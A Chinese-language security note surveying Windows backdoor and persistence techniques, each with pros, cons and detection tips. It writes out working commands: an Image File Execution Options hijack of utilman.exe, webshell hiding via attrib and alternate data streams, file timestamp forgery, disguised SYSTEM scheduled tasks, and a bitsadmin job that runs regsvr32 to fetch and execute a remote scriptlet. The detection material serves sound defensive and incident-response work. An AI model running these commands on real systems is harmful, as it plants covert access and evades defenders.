## windows常见backdoor、权限维持方法及排查技术

### 什么是Persistence？ [^1]

### 常见backdoor和persistence方式方法

1. #### 系统工具替换后门 [^2]

   ```powershell
   # Image劫持辅助工具管理器（utilman.exe, 快捷键 Win + U）
   # 注册表更改命令详见 `reg.exe` 应用程序
   REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
   # 结果就是只要按键盘 Win + U 就可以打开 cmd 窗口，而不是辅助工具管理器窗口
   ```

   - 类似的程序有osk.exe（屏幕键盘程序）、Narrator.exe（讲述人程序）、Magnify.exe（放大镜程序）等
   - 优点：简单
   - 缺点：易被检测
   - 排查：工具autoruns [^3]

2. #### 文件隐藏

   1. ##### attrib命令隐藏 [^4]

      `attrib +r +s +h webshell.php`

      - 优点：简单

      - 缺点：暂无
      - 排查：使用 attrib 命令，dir 命令（`dir /a`) 或者D盾

   2. ##### 使用ADS流隐藏webshell

      `echo "hello world" > demo.c:flags.txt`

      `echo "hello" > :key.txt` [^5]

      `notepad demo.c:flags.txt`

      `type demo.c:flags.txt`

      - ```powershell
        # 此时应该注意修改文件的timestamp，可使用如下的powershell命令或者使用NewFileTime工具
        # $(Get-Item ).creationtime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
        # $(Get-Item ).lastaccesstime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
        # $(Get-Item ).lastwritetime=$(Get-Date "mm/dd/yyyy hh:mm am/pm")
        # example：
        # Set the last-access time for a file aaa.csv to the current time:  
        $(Get-Item aaa.csv).lastwritetime=$(Get-Date)
        # Set the creation time of a file foo.txt to November 24, 2015, at 6:00am: 
        $(Get-Item foo.txt).creationtime=$(Get-Date "11/24/2015 06:00 am")
        ```

      - 优点：较难检测
      - 缺点：暂无
      - 排查： `dir /r`
      - Ref : [利用ADS隐藏webshell](https://www.cnblogs.com/xiaozi/p/7610984.html) 、[Windows ADS在渗透测试中的妙用](https://www.freebuf.com/articles/terminal/195721.html)

3. #### 计划任务

   `schtasks /delete /tn "AdobeReaderUpdate" /f`

   `schtasks /create /ru "System" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"`

   `SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr "powershell.exe Stop-Process -Name $processname"`

   `taskschd.msc`

   - 优点：简单
   - 缺点：易被检测
   - 排查： `schtasks /query `命令进行查询或者通过计算机的管理查看，注意在windows的中文版系统中，schtasks命令需要切换字符为美国英语格式，使用命令`chcp 437`，或者直接工具autoruns

4. #### 开机启动项

   ```powershell
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
   HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
   ...
   ```

   - 优点：重启权限维持
   - 缺点：一般杀软均会拦截
   - 排查：autoruns

5. #### 服务

   `sc create [ServerName] binPath= BinaryPathName`

   - 优点：重启权限维持
   - 缺点：一般杀软会拦截
   - 排查：工具autoruns

6. #### waitfor.exe

   - 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe
   - `certutil -encode infile outfile`
   - `certutil -decode infile outfile`
   - Ref : [详细参考](https://github.com/3gstudent/Waitfor-Persistence) 、[waitfor.md](waitfor.md) 
   - 优点：远程主动激活
   - 缺点：有waitfor进程
   - 排查：通过Process Explorer （procexp）工具查看是否有waitfor.exe进程，并进一步查看启动参数等

7. #### bitsadmin后门 [^6]

   ```powershell
   # 创建一个下载任务：
   bitsadmin /create backdoor
   # 添加文档：
   bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
   # 设置下载成功之后要执行的命令：
   bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
   # 执行任务：
   bitsadmin /Resume backdoor
   ```

   - Ref :  [bitsadmin.md](bitsadmin.md) 
   - 优点：系统自带无需上传
   - 缺点：免杀效果一般
   - 排查：`bitsadmin /list /verbose`

8. #### WMI后门

   - Ref: [参考文档](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)、[Powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/9e771d15bf19ab3c2ac196393c088ecdab6c9a73/Persistence/Persistence.psm1)
   - 优点：无文件，后门在系统重启五分钟之内触发且是system权限，相对来说难以排查
   - 缺点：暂无
   - 排查：工具autoruns

9. #### COM劫持

   - Ref: [freebuf](https://www.freebuf.com/articles/system/115241.html)、[CLR](https://www.4hou.com/technology/6863.html) 
   - 优点：隐藏性较好,autoruns查不到
   - 缺点：暂无
   - 排查：检查环境变量和注册表键值

10. #### meterpreter 权限维持 [^7]

  - `metsvc `是开机自启动的服务型后门
  - persistence模块是先上传vbs脚本并执行vbs脚本修改注册表`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`从而完成自启动
  - Ref : [metsvc代码](https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/scripts/meterpreter/metsvc.rb)、[persistence代码](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/persistence_exe.rb)
  - 优点：开机自启动
  - 缺点：容易被杀软杀
  - 排查：autoruns

11. #### Empire persistence模块 [^8]

    - Ref ： [参考文章](https://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/)
    - 优点：基本集成了大部分的权限维持方法
    - 缺点：暂无
    - 排查：工具autoruns

12. #### 进程注入 [^9]

    - Ref : [Hunting empire](https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/)
    - 优点：较难排查
    - 缺点：暂无
    - 排查：工具process explorer 、process monitor

### other

- 还有像是dll劫持、一些软件的插件后门、office后门等
- 更多windows backdoor方面最新文章可以关注国外安全研究员Casey Smith@subTee和Adam@Hexacorn

[原文](https://xz.aliyun.com/t/4842)

---

[^1]: 持久化是指即使在创建它的进程停止或其运行的机器断电之后仍然存在的对象和进程特性。当一个对象或状态被创建并且需要持久时，它将保存在非易失性存储位置（如硬盘驱动器）中，而不是临时文件或易失性随机存取存储器（RAM）
[^2]: Windows提供了一个命令replace.exe，通过它我们可以替换系统文件
[^3]: Windows Sysinternals工具集里的一个软件，可显示在系统启动或登录期间配置要运行的程序，以及启动各种内置Windows应用程序
[^4]: windows自带命令行工具attrib用来显示或更改文件属性
[^5]: 编辑时需退到上级目录进行查看 `dir /r`，删除时需要将宿主文件删除或使用 WinHex工具或压缩后解压替换
[^6]: Bitsadmin从win7之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行
[^7]: meterpreter中的权限维持技术有两种，一种是metsvc的后门(服务后门)，另外一种是persistence(注册表后门)
[^8]: Empire是一款功能非常强大的后渗透攻击框架。其中的persistence模块提供了一系列权限维持方法。工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)
[^9]: 准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下empire的psinject、cobaltstrike的inject和meterpreter中的migrate进程注入，一般可以注入到像是lsass或者explorer这样的进程当中，相对比较隐蔽，较难排查